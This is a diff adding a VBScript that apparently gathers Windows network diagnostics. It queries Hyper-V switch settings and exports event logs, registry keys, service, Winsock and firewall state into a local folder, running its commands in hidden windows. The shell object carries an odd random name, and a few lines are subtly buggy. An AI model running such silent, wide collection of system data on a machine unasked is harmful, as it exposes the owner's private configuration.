+                    Call AddXmlNodeEntry(xmlDoc, "PortRoutingDomainList", null, objPort, objPortRoutingDomainList)
+                    For each portRoutingDomainData in queryResult
+                        Call AddXmlNodeEntry(xmlDoc, "PortRoutingDomainMapping", null, objPortRoutingDomainList, objPortRoutingDomain)
+                        Call AddXmlNodeEntry(xmlDoc, "RoutingDomainGuid", portRoutingDomainData.RoutingDomainGuid, objPortRoutingDomain, objPortRoutingDomainGuid)
+                        Call AddXmlNodeEntry(xmlDoc, "RoutingDomainName", portRoutingDomainData.RoutingDomainName, objPortRoutingDomain, objPortRoutingDomainName)
+                        isolationIdString = ""
+                        for each isolationId In portRoutingDomainData.IsolationIdList
+                            isolationIdString = isolationIdString & isolationId & " "
+                        Next
+                        Call AddXmlNodeEntry(xmlDoc, "IsolationIdList", isolationIdString, objPortRoutingDomain, objPortIsolationIdList)
+                        isolationIdNameString = ""
+                        for each isolationIdName In portRoutingDomainData.IsolationIdNameList
+                            isolationIdNameString = isolationIdNameString & isolationIdName & " "
+                        Next
+                        Call AddXmlNodeEntry(xmlDoc, "IsolationIdNameList", isolationIdNameString, objPortRoutingDomain, objPortIsolationIdNameList)
+                    Next
+                End If
+                'Port VLAN setting
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortVlanSettingData")
+                If (queryResult.Count > 0) Then
+                    Set portVlanData = queryResult.ItemIndex(0)
+                    Call AddXmlNodeEntry(xmlDoc, "PortVlan", null, objPort, objPortVlan)
+                    Call AddXmlNodeEntry(xmlDoc, "VlanMode", vlanModeArray(portVlanData.OperationMode), objPortVlan, objPortVlanMode)
+                    if (portVlanData.OperationMode = 1) Then
+                        Call AddXmlNodeEntry(xmlDoc, "AccessVlanId", portVlanData.AccessVlanId, objPortVlan, objPortVlanAccess)
+                    End If
+                    if (portVlanData.OperationMode = 2) Then
+                        Call AddXmlNodeEntry(xmlDoc, "NativeVlanId", portVlanData.NativeVlanId, objPortVlan, objPortVlanNative)
+                        trunkVlanString = ""
+                        for each trunkVlanId In portVlanData.TrunkVlanIdArray
+                            trunkVlanString = trunkVlanString & trunkVlanId & " "
+                        Next
+                        Call AddXmlNodeEntry(xmlDoc, "TrunkVlanArray", trunkVlanString, objPortVlan, objPortVlanTrunk)
+                        pruneVlanString = ""
+                        for each prunevlanId In portVlanData.PruneVlanIdArray
+                            tpruneVlanString = pruneVlanString & prunevlanId & " "
+                        Next
+                        Call AddXmlNodeEntry(xmlDoc, "PruneVlanArray", trunkVlanString, objPortVlan, objPortVlanPrune)
+                    End If
+                    if (portVlanData.OperationMode = 3) Then
+                        Call AddXmlNodeEntry(xmlDoc, "PvlanMode", PvlanModeArray(portVlanData.PvlanMode), objPortVlan, objPortPVlanMode)
+                        Call AddXmlNodeEntry(xmlDoc, "PrimaryVlanId", portVlanData.PrimaryVlanId, objPortVlan, objPortPrimaryVlanId)
+                        Call AddXmlNodeEntry(xmlDoc, "SecondaryVlanId", portVlanData.SecondaryVlanId, objPortVlan, objPortSecondaryVlanId)
+                        secondaryVlanString = ""
+                        for each secondaryVlanId In portVlanData.SecondaryVlanIdArray
+                            secondaryVlanString = secondaryVlanString & secondaryVlanId & " "
+                        Next
+                        Call AddXmlNodeEntry(xmlDoc, "SecondaryVlanArray", secondaryVlanString, objPortVlan, objPortVlanSecondary)
+                    End If
+                End If
+                'Extended Port ACLs
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortExtendedAclSettingData")
+                If (queryResult.Count > 0) Then
+                    Call AddXmlNodeEntry(xmlDoc, "PortExtendedAclList", null, objPort, objPortEaclList)
+                    for each extendedacl In queryResult
+                        Call AddXmlNodeEntry(xmlDoc, "ExtendedAcl", null, objPortEaclList, objPortEacl)
+                        Call AddXmlNodeEntry(xmlDoc, "Action", aclActionArray(extendedAcl.Action), objPortEacl, objPortEaclAction)
+                        Call AddXmlNodeEntry(xmlDoc, "Direction", aclDirectionArray(extendedAcl.Direction), objPortEacl, objPortEaclDirection)
+                        Call AddXmlNodeEntry(xmlDoc, "Weight", extendedAcl.Weight, objPortEacl, objPortEaclWeight)
+                        Call AddXmlNodeEntry(xmlDoc, "Protocol", extendedAcl.Protocol, objPortEacl, objPortEaclProtocol)
+                        Call AddXmlNodeEntry(xmlDoc, "LocalIPAddress", extendedAcl.LocalIPAddress, objPortEacl, objPortEaclLocalIP)
+                        Call AddXmlNodeEntry(xmlDoc, "LocalPort", extendedAcl.LocalPort, objPortEacl, objPortEaclLocalPort)
+                        Call AddXmlNodeEntry(xmlDoc, "RemoteIPAddress", extendedAcl.RemoteIPAddress, objPortEacl, objPortEaclRemoteIP)
+                        Call AddXmlNodeEntry(xmlDoc, "RemotePort", extendedAcl.RemotePort, objPortEacl, objPortEaclRemotePort)
+                        Call AddXmlNodeEntry(xmlDoc, "Stateful", onOffState(extendedAcl.Stateful+1), objPortEacl, objPortEaclStateful)
+                        Call AddXmlNodeEntry(xmlDoc, "IsolationID", extendedAcl.IsolationID, objPortEacl, objPortEaclIsolationId)
+                    Next
+                End If
+                'Port ACLs
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortAclSettingData")
+                If (queryResult.Count > 0) Then
+                    Call AddXmlNodeEntry(xmlDoc, "PortAclList", null, objPort, objPortAclList)
+                    for each acl In queryResult
+                        Call AddXmlNodeEntry(xmlDoc, "Acl", null, objPortAclList, objPortAcl)
+                        Call AddXmlNodeEntry(xmlDoc, "Action", aclActionArray(acl.Action), objPortAcl, objPortAclAction)
+                        Call AddXmlNodeEntry(xmlDoc, "AclType", aclTypeArray(acl.AclType), objPortAcl, objPortAclType)
+                        Call AddXmlNodeEntry(xmlDoc, "Applicability", aclApplicabilityArray(acl.Applicability), objPortAcl, objPortAclApplicability)
+                        Call AddXmlNodeEntry(xmlDoc, "Direction", aclDirectionArray(acl.Direction), objPortAcl, objPortAclDirection)
+                        Call AddXmlNodeEntry(xmlDoc, "LocalAddress", acl.LocalAddress, objPortAcl, objPortAclLocalAddress)
+                        Call AddXmlNodeEntry(xmlDoc, "LocalAddressPrefixLength", acl.LocalAddressPrefixLength, objPortAcl, objPortAclLocalAddressPrefixLength)
+                        Call AddXmlNodeEntry(xmlDoc, "RemoteAddress", acl.RemoteAddress, objPortAcl, objPortAclRemoteAddress)
+                        Call AddXmlNodeEntry(xmlDoc, "RemoteAddressPrefixLength", acl.RemoteAddressPrefixLength, objPortAcl, objPortAclRemoteAddressPrefixLength)
+                    Next
+                End If
+
+                'Connected NIC
+                Set portLanEndPoint = port.Associators_("Msvm_EthernetDeviceSAPImplementation", "Msvm_LANEndpoint").ItemIndex(0)
+                Set nicLanEndPoint = portLanEndPoint.Associators_("Msvm_ActiveConnection", "Msvm_LANEndpoint").ItemIndex(0)
+                logNic = false
+
+                'Synthetic NIC
+                Set queryResult = nicLanEndPoint.Associators_("Msvm_DeviceSAPImplementation", "Msvm_SyntheticEthernetPort")
+                If (queryResult.Count > 0) Then
+                    Set nic = queryResult.ItemIndex(0)
+                    nicType = 0
+                    logNic = True
+                End If
+                
+                'Emulated NIC
+                Set queryResult = nicLanEndPoint.Associators_("Msvm_DeviceSAPImplementation", "Msvm_EmulatedEthernetPort")
+                If (queryResult.Count > 0) Then
+                    Set nic = queryResult.ItemIndex(0)
+                    nicType = 1
+                    logNic = True
+                End If
+                
+                'Internal NIC
+                Set queryResult = nicLanEndPoint.Associators_("Msvm_EthernetDeviceSAPImplementation", "Msvm_InternalEthernetPort")
+                If (queryResult.Count > 0) Then
+                    Set nic = queryResult.ItemIndex(0)
+                    nicType = 2
+                    logNic = True
+                End If
+                
+                'External NIC
+                Set queryResult = nicLanEndPoint.Associators_("Msvm_EthernetDeviceSAPImplementation", "Msvm_ExternalEthernetPort")
+                If (queryResult.Count > 0) Then
+                    Set nic = queryResult.ItemIndex(0)
+                    nicType = 3
+                    logNic = True
+                End If
+                
+                If (logNic = True) Then 
+                    Call AddXmlNodeEntry(xmlDoc, "Nic", null, objPort, objNic)
+                    Call AddXmlNodeEntry(xmlDoc, "DeviceId", nic.DeviceId, objNic, objNicId)
+                    Call AddXmlNodeEntry(xmlDoc, "NicType", nicTypeArray(nicType), objNic, objNicId)
+                    If (IsNull(nic.NetworkAddresses) = False) Then
+                        For Each networkAddress In nic.NetworkAddresses
+                            Call AddXmlNodeEntry(xmlDoc, "NetworkAddress", networkAddress, objNic, objNicNetAddress)    
+                        Next
+                    End If
+                    Call AddXmlNodeEntry(xmlDoc, "PermanentAddress", nic.PermanentAddress, objNic, objNicPermAddress)
+                    Call AddXmlNodeEntry(xmlDoc, "ActiveMTU", nic.ActiveMaximumTransmissionUnit, objNic, objNicActiveMTU)
+                    If (nicType = 0 Or nicType = 1) Then
+                        Call AddXmlNodeEntry(xmlDoc, "VMId", nic.SystemName, objNic, objNicVmId)
+                        strQuery = "Select * from MSVM_ComputerSystem WHERE Name='" + nic.SystemName + "'"
+                        Set queryResult = objVirtualizationService.ExecQuery(strQuery)
+                        If (queryResult.Count > 0) Then
+                            Set vm = queryResult.ItemIndex(0)
+                            Call AddXmlNodeEntry(xmlDoc, "VMName", vm.ElementName, objNic, objNicVmName)
+                        End If
+                    End If
+                 End If 
+            Next
+        Next
+
+        ' Disconnected NIC info
+        strQueryArray = Array("Select * from MSVM_SyntheticEthernetPort", "Select * from MSVM_EmulatedEthernetPort")
+        nicType = 0
+        Call AddXmlNodeEntry(xmlDoc, "DisconnectedNics", null, objRoot, objDisconnectedNics)
+        For Each strQuery in strQueryArray
+            Set switchPort = objVirtualizationService.ExecQuery (strQuery)
+            For Each nic In switchPort
+                Set lanEndPoint = port.Associators_("Msvm_DeviceSAPImplementation", "Msvm_LANEndpoint")
+                Set connectedlanEndPoint = lanEndPoint.Associators_("Msvm_ActiveConnection", "Msvm_LANEndpoint")
+                if (connectedlanEndPoint.Count = 0) Then
+                    Call AddXmlNodeEntry(xmlDoc, "Nic", null, objDisconnectedNics, objNic)
+                    Call AddXmlNodeEntry(xmlDoc, "DeviceId", nic.DeviceId, objNic, objNicId)
+                    Call AddXmlNodeEntry(xmlDoc, "NicType", nicTypeArray(nicType), objNic, objNicId)
+                    If (IsNull(nic.NetworkAddresses) = False) Then
+                        For Each networkAddress In nic.NetworkAddresses
+                            Call AddXmlNodeEntry(xmlDoc, "NetworkAddress", networkAddress, objNic, objNicNetAddress)    
+                        Next
+                    End If
+                    Call AddXmlNodeEntry(xmlDoc, "PermanentAddress", nic.PermanentAddress, objNic, objNicPermAddress)
+                    Call AddXmlNodeEntry(xmlDoc, "ActiveMTU", nic.ActiveMaximumTransmissionUnit, objNic, objNicActiveMTU)
+                    If (nicType = 0 Or nicType = 1) Then
+                        Call AddXmlNodeEntry(xmlDoc, "VMId", nic.SystemName, objNic, objNicVmId)
+                        strQuery = "Select * from MSVM_ComputerSystem WHERE Name='" + nic.SystemName + "'"
+                        Set queryResult = objVirtualizationService.ExecQuery(strQuery)
+                        If (queryResult.Count > 0) Then
+                            Set vm = queryResult.ItemIndex(0)
+                            Call AddXmlNodeEntry(xmlDoc, "VMName", vm.ElementName, objNic, objNicVmName)
+                        End If
+                    End If
+                End If
+            Next
+            nicType = nicType + 1
+        Next
+
+
+        Set objIntro = xmlDoc.CreateProcessingInstruction ("xml", "version='1.0'")
+        xmlDoc.insertBefore objIntro, xmlDoc.childNodes(0)
+        xmlDoc.Save outputFileName
+
+    Else 
+        
+    End If
+
+End Sub
+
+Sub GetVmswitchLog(vmswitchlogFileName, vmmslogFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    'Export the vmswitch events from system log
+    cmd = "cmd /c wevtutil epl System /q:""*[System[Provider[@Name='Microsoft-Windows-Hyper-V-VmSwitch']]]"" " & vmswitchlogFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & vmswitchlogFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    'Export the VMMS networking log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Hyper-V-VMMS-Networking"" " & vmmslogFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & vmmslogFileName
+    DKGlXlJ.Run cmd, 0, True       
+End Sub
+
+Sub GetApplicationExportLog(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    'Export the ApplicationExport log
+    cmd = "cmd /c wevtutil epl Application " & logFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetSystemExportLog(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    'Export the ApplicationExport log
+    cmd = "cmd /c wevtutil epl System " & logFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    'Archive the log so that it can be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetHotFixInfo(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c wmic qfe >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetCreateBindingMap(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netcfg -m >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetWinsockLog(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c reg.exe query hklm\system\CurrentControlSet\Services\Winsock\Parameters /v Transports >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c reg.exe query ""hklm\system\CurrentControlSet\Services\Winsock\Setup Migration"" /v ""Provider List"" >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh.exe winsock show catalog >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetEpdPolicies(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EnterpriseDataProtection\Policies " & outputFileName & " /y /Reg:64"
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetPolicyManager(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\Providers " & outputFileName & " /y /Reg:64"
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetHomeGroupListener(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HomeGroupListener " & outputFileName & " /y /Reg:64"
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetHomeGroupProvider(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HomeGroupProvider " & outputFileName & " /y /Reg:64"
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetServiceLogInfo(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c sc.exe queryex nativewifip >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc.exe qc nativewifip >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc.exe queryex wlansvc >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc.exe qc wlansvc >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc.exe queryex dhcp >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c sc.exe qc dhcp >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetPowershellInfo(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "powershell -command " & _
+    "$net_adapter=(Get-NetAdapter -IncludeHidden); "  & _
+    "$output= ($net_adapter); " & _
+    "$output += ($net_adapter | fl *); " & _
+    "$output += (Get-NetAdapterAdvancedProperty | fl); " & _
+    "$net_adapter_bindings=(Get-NetAdapterBinding -IncludeHidden); " & _
+    "$output += ($net_adapter_bindings); " & _
+    "$output += ($net_adapter_bindings | fl); " & _
+    "$output += (Get-NetIpConfiguration -Detailed); " & _
+    "$output += (Get-DnsClientNrptPolicy); " & _
+    "$output += (Resolve-DnsName bing.com); " & _
+    "$output += (ping bing.com -4); " & _
+    "$output += (ping bing.com -6); " & _
+    "$output += (Test-NetConnection bing.com -InformationLevel Detailed); " & _
+    "$output += (Test-NetConnection bing.com -InformationLevel Detailed -CommonTCPPort HTTP); " & _
+    "$output += (Get-NetRoute); " & _
+    "$output += (Get-NetIPaddress); " & _
+    "$output += (Get-NetLbfoTeam); " & _
+    "$output += (Get-Service -Name:VMMS); " & _
+    "$output += (Get-VMSwitch); " & _
+    "$output += ""(Get-VMNetworkAdapter -all)""; " & _
+    "$output += (Get-DnsClientNrptPolicy); " & _
+    "$output += (Get-WindowsOptionalFeature -Online); " & _
+    "$output += (Get-Service | fl); " & _
+    "$pnp_devices = (Get-PnpDevice); " & _
+    "$output += ($pnp_devices); " & _
+    "$output += ($pnp_devices | Get-PnpDeviceProperty -KeyName DEVPKEY_Device_InstanceId,DEVPKEY_Device_DevNodeStatus,DEVPKEY_Device_ProblemCode); " & _
+    "$output | Out-File " & outputFileName
+
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+Sub GetExistingFile(inputFileName, outputDirectory)
+    On Error Resume Next
+
+    dim outputPath
+
+    outputPath = outputDirectory & "\"
+    outputPath = Replace(outputPath, "\\", "\") 
+
+    If fso.FileExists(inputFileName) Then
+        fso.CopyFile inputFileName, outputPath
+    End If
+End Sub
+
+Sub GetExistingFiles(inputPath, outputPath, filePrefix, fileSuffix)
+    On Error Resume Next
+
+    exists = fso.FolderExists(inputpath)
+    if (exists) then
+        Set objFolder = fso.GetFolder(inputpath)
+        Set colFiles = objFolder.Files
+        Set fileNameForCab = ""
+        For Each objFile in colFiles
+            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN
+                if Right(objFile.Name, Len(fileSuffix)) = fileSuffix THEN
+                    Call GetExistingFile(inputPath & objFile.Name, outputPath)
+                    fileNameForCab = Replace(objFile.Name, "%", "-")
+                    fso.MoveFile outputPath & "\" & objFile.Name, outputPath & "\" & fileNameForCab
+                end if
+            end if
+        Next
+    end if
+End Sub
+
+Sub GetExistingFiles(inputPath, outputPath, filePrefix)
+    On Error Resume Next
+
+    exists = fso.FolderExists(inputpath)
+    if (exists) then
+        Set objFolder = fso.GetFolder(inputpath)
+        Set colFiles = objFolder.Files
+        Set fileNameForCab = ""
+        For Each objFile in colFiles
+            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN                
+                    Call GetExistingFile(inputPath & objFile.Name, outputPath)
+                    fileNameForCab = Replace(objFile.Name, "%", "-")
+                    fso.MoveFile outputPath & "\" & objFile.Name, outputPath & "\" & fileNameForCab                
+            end if
+        Next
+    end if
+End Sub
+
+Sub GetPantherFiles(inputPath, outputPath, outputFilePrefix, filePrefix, fileSuffix)
+    On Error Resume Next
+
+    exists = fso.FolderExists(inputpath)
+    if (exists) then
+        Set objFolder = fso.GetFolder(inputpath)
+        Set colFiles = objFolder.Files
+
+        For Each objFile in colFiles
+            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN
+                if Right(objFile.Name, Len(fileSuffix)) = fileSuffix THEN
+                    Call GetExistingFile(inputPath & objFile.Name, outputPath)
+                    'add prefix to output file to avoid copying over files with identical names
+                    fso.MoveFile outputPath & "\" & objFile.Name, outputPath & "\" & outputFilePrefix & objFile.Name
+                end if
+            end if
+        Next
+    end if
+End Sub
+
+Sub GetWlanReport(outputPath)
+    On Error Resume Next
+
+    dim wlanOutputPath
+    wlanOutputPath = shell.ExpandEnvironmentStrings("%programdata%\") & "Microsoft\Windows\WlanReport\"
+    exists = fso.FolderExists(wlanOutputPath)
+    if (exists) then
+        Set objFolder = fso.GetFolder(wlanOutputPath)
+        objFolder.Delete True
+    end if
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+    cmd = "cmd /c netsh wlan show wlanreport"
+    DKGlXlJ.Run cmd, 0, True
+
+    Set colFiles = objFolder.Files
+    For Each objFile in colFiles
+        Call GetExistingFile(wlanOutputPath & objFile.Name, outputPath)
+    Next
+End Sub
+
+Sub GetBatteryReport(batteryReportFilename)
+    On Error Resume Next
+        
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+    cmd = "cmd /c powercfg.exe /batteryreport /output " & batteryReportFilename
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+Sub GetLatestNdfSessionEtlFile(inputPath, outputPath, filePrefix, fileSuffix)
+
+    currentDirectory = fso.GetAbsolutePathName(".")
+    dirParts = Split(currentDirectory, "\")
+    drive = dirParts(0)
+    usersFolder = dirParts(1)
+    username = dirParts(2)
+    fullInputPath = drive + "\" + usersFolder + "\" + username + "\" + inputPath
+
+    exists = fso.FolderExists(fullInputPath)
+    if (exists) then
+        Set objFolder = fso.GetFolder(fullInputPath)
+        Set colFiles = objFolder.Files
+        Set mostRecent = Nothing
+        For Each objFile in colFiles
+            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN
+                if Right(objFile.Name, Len(fileSuffix)) = fileSuffix THEN
+                    if (mostRecent is Nothing) THEN
+                        Set mostRecent = objFile
+                    elseif (objFile.DateLastModified > mostRecent.DateLastModified) THEN
+                        Set mostRecent = objFile
+                    end if
+                end if
+            end if
+        Next
+        if NOT (mostRecent is Nothing) THEN
+            Call GetExistingFile(fullInputPath & mostRecent.Name, outputPath)
+        end if
+    end if
+End Sub
+
+On Error Resume Next
+
+Dim adapterInfoFile, netInfoFile, WcnInfoFile
+
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Set shell = WScript.CreateObject( "WScript.Shell" )
+sysdrive = shell.ExpandEnvironmentStrings("%SystemDrive%\")
+systemRoot = shell.ExpandEnvironmentStrings("%SystemRoot%\")
+
+configFolder = "config"
+osinfoFileName = configFolder + "\osinfo.txt"
+adapterinfoFileName = configFolder + "\adapterinfo.txt"
+envinfoFileName = configFolder + "\envinfo.txt"
+wirelessAutoconfigLogFileName = configFolder + "\WLANAutoConfigLog.evtx"
+wcmLogFileName = configFolder + "\WCMLog.evtx"
+wwanLogFileName = configFolder + "\WWANLog.evtx"
+wscatFileName = configFolder + "\WinsockCatalog.txt"
+miracastFileName = configFolder + "\wlaninfo.txt"
+wcnFileName = configFolder + "\WcnInfo.txt"
+wcncachedumpFile= sysdrive + "\wcncachedump.txt"
+windowsFirewallConfigFileName = configFolder + "\WindowsFirewallConfig.txt"
+windowsFirewallEffectiveRulesFileName = configFolder + "\WindowsFirewallEffectiveRules.txt"
+windowsFirewallLogFileName = configFolder + "\WindowsFirewallLog.evtx"
+windowsFirewallConsecLogFileName = configFolder + "\WindowsFirewallConsecLog.evtx"
+windowsFirewallVerboseLogFileName = configFolder + "\WindowsFirewallLogVerbose.evtx"
+windowsFirewallConsecVerboseLogFileName = configFolder + "\WindowsFirewallConsecLogVerbose.evtx"
+wfpfiltersfilename=configFolder + "\wfpfilters.xml"
+wfplogfilename=configFolder + "\wfplog.log"
+netioStateFilename=configFolder + "\netiostate.txt"
+dnsInfoFileName = configFolder + "\Dns.txt"
+neighborsFileName = configFolder + "\Neighbors.txt"
+filesharingFileName = configFolder + "\FileSharing.txt"
+gpresultFileName = configFolder + "\gpresult.txt"
+neteventsFileName = configFolder + "\netevents.xml"
+neteventsFileLog = configFolder + "\neteventslog.txt"
+showstateFileName = configFolder + "\wfpstate.xml"
+showstateFileLog = configFolder + "\wfpstatelog.txt"
+sysportsFileName = configFolder + "\sysports.xml"
+sysportsFileLog = configFolder + "\sysportslog.txt"
+vmswitchFileName = configFolder + "\vmswitchInfo.xml"
+vmswitchLogFileName = configFolder + "\VmSwitchLog.evtx"
+vmmsLogFileName = configFolder + "\VmmsNetworkingLog.evtx"
+applicationExportFileName = configFolder + "\Application_Export.evtx"
+systemExportFileName = configFolder + "\System_Export.evtx"
+hotFixInfoFileName = configFolder + "\Hotfixinfo.log"
+createBindingMapFileName = configFolder + "\CreateBindingMap.log"
+serviceInfoFileName = configFolder + "\serviceinfo.log"
+powershellInfoFileName = configFolder + "\PowershellInfo.log"
+evtxInputFilePath = systemRoot + "System32\Winevt\Logs\"
+dhcpEvtxInputFilePrefix = "Microsoft-Windows-Dhcp"
+dhcpEvtxInputFileSuffix = ".evtx"
+ncsiEvtxInputFilePrefix = "Microsoft-Windows-NCSI"
+ncsiEvtxInputFileSuffix = "Operational.evtx"
+wcmsvcEvtxInputFilePrefix = "Microsoft-Windows-Wcmsvc"
+wcmsvcEvtxInputFileSuffix = "Operational.evtx"
+wlanAutoConfigEvtxInputFilePrefix = "Microsoft-Windows-WLAN-AutoConfig"
+wlanAutoConfigEvtxInputFileSuffix = ".evtx"
+serviceEtlFilePrefix = "service."
+scmEvmFilePrefix = "SCM."
+etlFileSuffix = ".etl"
+serviceEtlFilePath = systemRoot + "\Logs\NetSetup\"
+scmEvmfilePath = systemRoot + "\System32\LogFiles\SCM\"
+winsockLogFileName = configFolder + "\winsock.log"
+netsetupigFileName = systemRoot + "\System32\netsetupmig.log"
+pantherSetupFilePrefix = "setup"
+pantherSetupFileSuffix = ".log"
+windowsPantherInputPath = systemRoot + "panther\"
+windowsPantherOutputFilePrefix = "windows_panther_"
+sourcesPantherInputPath = sysdrive + "$Windows.~BT\Sources\Panther\"
+sourcesPantherOutputFilePrefix = "sources_panther_"
+edpPoliciesFileName = configFolder + "\EDPPolicies.reg"
+policyManagerFileName = configFolder + "\PolicyManager.reg"
+homeGroupListenerFileName = configFolder + "\HomeGroupListener.reg"
+homeGroupProviderFileName = configFolder + "\HomeGroupProvider.reg"
+netTraceInputPath = "AppData\Local\Microsoft\NetTraces\"
+netTraceEtlFilePrefix = "NdfSession"
+batteryReportFilename = configFolder + "\battery-report.html"
+
+if Not FSO.FolderExists(configFolder) Then
+    FSO.CreateFolder configFolder
+End If
+
+call GetGPResultInfo(gpresultFileName)
+
+call DumpAllKeys
+
+call GetOSInfo(osinfoFileName)
+
+call GetBatteryReport(batteryReportFilename)
+
+Set adapterInfoFile = FSO.OpenTextFile(adapterInfoFileName, 2, True)
+
+call GetWirelessAdapterInfo(adapterInfoFile)
+
+call GetWiredAdapterInfo(adapterInfoFile)
+
+adapterInfoFile.Close
+
+call GetWirelessAutoconfigLog(wirelessAutoConfigLogFileName)
+
+call GetWcmLog(wcmLogFileName)
+
+call GetWwanLog(wwanLogFileName)
+
+call GetEnvironmentInfo(envinfoFileName)
+
+call DumpWinsockCatalog(wscatFileName)
+
+call GetWindowsFirewallInfo(windowsFirewallConfigFileName, windowsFirewallLogFileName, windowsFirewallEffectiveRulesFileName,windowsFirewallConsecLogFileName, windowsFirewallVerboseLogFileName, windowsFirewallConsecVerboseLogFileName)
+
+call GetMiracastInfo(miracastFileName)
+
+call GetWcnInfo(wcnFileName)
+
+call GetNetioInfo(netioStateFilename)
+
+call GetDnsInfo(dnsInfoFileName)
+
+call GetNeighborInfo(neighborsFileName)
+
+call GetFileSharingInfo(filesharingFileName)
+
+call GetNetEventsInfo(neteventsFileName, neteventsFileLog)
+
+call GetShowStateInfo(showstateFileName, showstateFileLog)
+
+call GetSysPortsInfo(sysportsFileName, sysportsFileLog)
+
+call GetVmswitchInfo(vmswitchFileName)
+
+Call GetVmswitchLog(vmswitchLogFileName, vmmsLogFileName)
+
+Call GetHotFixInfo(hotFixInfoFileName)
+
+Call GetServiceLogInfo(serviceInfoFileName)
+
+Call GetExistingFiles(scmEvmfilePath, configFolder, scmEvmFilePrefix)
+
+Call GetPantherFiles(sourcesPantherInputPath, configFolder, sourcesPantherOutputFilePrefix, pantherSetupFilePrefix, pantherSetupFileSuffix)
+
+Call GetWinsockLog(winsockLogFileName)
+
+Call GetExistingFile(netsetupigFileName, configFolder)
+
+Call GetEpdPolicies(edpPoliciesFileName)
+
+Call GetPolicyManager(policyManagerFileName)
+
+Call GetHomeGroupListener(homeGroupListenerFileName)
+
+Call GetHomeGroupProvider(homeGroupProviderFileName)
+
+Call GetLatestNdfSessionEtlFile(netTraceInputPath, configFolder, netTraceEtlFilePrefix, etlFileSuffix)
+
+Call GetPowershellInfo(powershellInfoFileName)
